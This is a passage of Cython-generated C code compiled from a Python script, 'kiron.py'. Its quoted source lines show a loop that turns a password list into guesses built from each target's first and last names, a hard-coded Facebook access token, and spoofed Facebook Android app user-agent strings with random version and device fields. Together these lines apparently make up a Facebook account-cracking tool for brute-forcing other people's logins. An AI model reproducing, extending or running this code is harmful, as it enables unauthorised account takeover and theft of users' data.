          PyObject *__pyx_callargs[3] = {__pyx_t_10, __pyx_n_s_Last, __pyx_v_ln};
          __pyx_t_12 = __Pyx_PyObject_FastCall(__pyx_t_18, __pyx_callargs+1-__pyx_t_13, 2+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 581, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        }
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_replace); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 581, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_12 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_12)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_12);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_12, __pyx_n_s_Name, __pyx_v_names};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_18, __pyx_callargs+1-__pyx_t_13, 2+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 581, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        }
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_replace); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 581, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_names, __pyx_n_s_lower); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 581, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_10 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_12))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_12);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_12, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_10, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_12, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 581, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        }
        __pyx_t_12 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_12)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_12);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_12, __pyx_n_s_name, __pyx_t_4};
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_18, __pyx_callargs+1-__pyx_t_13, 2+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 581, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_pas, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":582
 *                 for pw in passlist:
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'             # <<<<<<<<<<<<<<
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))
 */
        __Pyx_INCREF(__pyx_kp_s_350685531728_62f8ce9f74b12f84c12);
        __Pyx_XDECREF_SET(__pyx_v_accessToken, __pyx_kp_s_350685531728_62f8ce9f74b12f84c12);

        /* "kiron.py":583
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'             # <<<<<<<<<<<<<<
 *                         fbbv = str(random.randint(111111111,999999999))
 *                         android_version = device['android_version']
 */
        __pyx_t_5 = PyTuple_New(5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 583, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_22 = 0;
        __pyx_t_8 = 127;
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_random); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 583, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_randint); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 583, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__41, NULL); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 583, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_18, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 583, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_8;
        __pyx_t_22 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_0_0);
        __pyx_t_22 += 5;
        __Pyx_GIVEREF(__pyx_kp_u_0_0);
        PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_kp_u_0_0);
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 583, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_randint); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 583, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_18, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 583, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 583, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) : __pyx_t_8;
        __pyx_t_22 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_18);
        __Pyx_GIVEREF(__pyx_t_18);
        PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_t_18);
        __pyx_t_18 = 0;
        __Pyx_INCREF(__pyx_kp_u__11);
        __pyx_t_22 += 1;
        __Pyx_GIVEREF(__pyx_kp_u__11);
        PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_kp_u__11);
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_random); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 583, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_randint); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 583, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__41, NULL); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 583, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_18, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 583, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_8;
        __pyx_t_22 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_5, 4, __pyx_t_4);
        __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_5, 5, __pyx_t_22, __pyx_t_8); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 583, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbav, ((PyObject*)__pyx_t_4));
        __pyx_t_4 = 0;

        /* "kiron.py":584
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))             # <<<<<<<<<<<<<<
 *                         android_version = device['android_version']
 *                         model = device['model']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 584, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_randint); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 584, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__81, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 584, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 584, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbbv, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":585
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))
 *                         android_version = device['android_version']             # <<<<<<<<<<<<<<
 *                         model = device['model']
 *                         build = device['build']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 585, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_android_version); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 585, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_android_version, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "kiron.py":586
 *                         fbbv = str(random.randint(111111111,999999999))
 *                         android_version = device['android_version']
 *                         model = device['model']             # <<<<<<<<<<<<<<
 *                         build = device['build']
 *                         fblc = device['fblc']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 586, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_model); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 586, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_model, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":587
 *                         android_version = device['android_version']
 *                         model = device['model']
 *                         build = device['build']             # <<<<<<<<<<<<<<
 *                         fblc = device['fblc']
 *                         fbcr = sim_id
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 587, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_build); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 587, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_build, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "kiron.py":588
 *                         model = device['model']
 *                         build = device['build']
 *                         fblc = device['fblc']             # <<<<<<<<<<<<<<
 *                         fbcr = sim_id
 *                         fbmf = device['fbmf']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 588, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_fblc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 588, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fblc, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":589
 *                         build = device['build']
 *                         fblc = device['fblc']
 *                         fbcr = sim_id             # <<<<<<<<<<<<<<
 *                         fbmf = device['fbmf']
 *                         fbbd = device['fbbd']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sim_id); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 589, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_XDECREF_SET(__pyx_v_fbcr, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":590
 *                         fblc = device['fblc']
 *                         fbcr = sim_id
 *                         fbmf = device['fbmf']             # <<<<<<<<<<<<<<
 *                         fbbd = device['fbbd']
 *                         fbdv = device['fbdv']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 590, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_fbmf); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 590, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbmf, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "kiron.py":591
 *                         fbcr = sim_id
 *                         fbmf = device['fbmf']
 *                         fbbd = device['fbbd']             # <<<<<<<<<<<<<<
 *                         fbdv = device['fbdv']
 *                         fbsv = device['fbsv']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 591, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_fbbd); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 591, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbbd, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":592
 *                         fbmf = device['fbmf']
 *                         fbbd = device['fbbd']
 *                         fbdv = device['fbdv']             # <<<<<<<<<<<<<<
 *                         fbsv = device['fbsv']
 *                         fbca = device['fbca']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 592, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_fbdv); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 592, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbdv, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "kiron.py":593
 *                         fbbd = device['fbbd']
 *                         fbdv = device['fbdv']
 *                         fbsv = device['fbsv']             # <<<<<<<<<<<<<<
 *                         fbca = device['fbca']
 *                         fbdm = device['fbdm']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 593, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_fbsv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 593, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbsv, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":594
 *                         fbdv = device['fbdv']
 *                         fbsv = device['fbsv']
 *                         fbca = device['fbca']             # <<<<<<<<<<<<<<
 *                         fbdm = device['fbdm']
 *                         fbfw = '1'
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 594, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_fbca); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 594, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbca, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "kiron.py":595
 *                         fbsv = device['fbsv']
 *                         fbca = device['fbca']
 *                         fbdm = device['fbdm']             # <<<<<<<<<<<<<<
 *                         fbfw = '1'
 *                         fbrv = '0'
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 595, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_fbdm); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 595, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbdm, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":596
 *                         fbca = device['fbca']
 *                         fbdm = device['fbdm']
 *                         fbfw = '1'             # <<<<<<<<<<<<<<
 *                         fbrv = '0'
 *                         fban = 'FB4A'
 */
        __Pyx_INCREF(__pyx_kp_s_1);
        __Pyx_XDECREF_SET(__pyx_v_fbfw, __pyx_kp_s_1);

        /* "kiron.py":597
 *                         fbdm = device['fbdm']
 *                         fbfw = '1'
 *                         fbrv = '0'             # <<<<<<<<<<<<<<
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'
 */
        __Pyx_INCREF(__pyx_kp_s_0_2);
        __Pyx_XDECREF_SET(__pyx_v_fbrv, __pyx_kp_s_0_2);

        /* "kiron.py":598
 *                         fbfw = '1'
 *                         fbrv = '0'
 *                         fban = 'FB4A'             # <<<<<<<<<<<<<<
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
 */
        __Pyx_INCREF(__pyx_n_s_FB4A);
        __Pyx_XDECREF_SET(__pyx_v_fban, __pyx_n_s_FB4A);

        /* "kiron.py":599
 *                         fbrv = '0'
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'             # <<<<<<<<<<<<<<
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
 *                         random_seed = random.Random()
 */
        __Pyx_INCREF(__pyx_kp_s_com_facebook_katana);
        __Pyx_XDECREF_SET(__pyx_v_fbpn, __pyx_kp_s_com_facebook_katana);

        /* "kiron.py":600
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'             # <<<<<<<<<<<<<<
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 */
        __pyx_t_5 = PyNumber_Add(__pyx_kp_s_Davik_2_1_0_Linux_U_Android, __pyx_v_android_version); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_0_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_model); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_Build); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_build); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBAN); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_fban); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBAV); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_fbav); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBBV); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_fbbv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBDM_density_2_625_width_1080_h); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_fblc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBRV); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_random); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_randint); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_18, __pyx_tuple__82, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
